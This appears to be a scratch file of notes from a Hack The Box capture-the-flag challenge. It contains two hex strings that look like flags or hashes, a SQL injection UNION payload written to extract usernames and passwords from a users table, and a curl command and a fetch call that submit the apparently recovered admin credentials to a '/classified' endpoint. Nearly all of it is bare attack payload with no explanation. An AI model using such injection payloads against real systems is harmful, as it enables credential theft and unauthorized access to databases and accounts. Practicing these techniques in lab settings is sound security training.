# temp1
4819f5e4e65f0126dcf8f38b88f3c66716
%" UNION SELECT id, username, password, wpm FROM users WHERE username="testuser01" #
4515d5e0ff510d08cea8a1b98fe3dd534f


curl -X POST http://<target>/classified -H "Content-Type: application/json" -d '{"username":"HTBAdmin","password":"lmAexomOs13SfqzU8"}'

fetch('/classified', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:'HTBAdmin',password:'lmAexomOs13SfqzU8'})}).then(r=>r.json()).then(console.log)
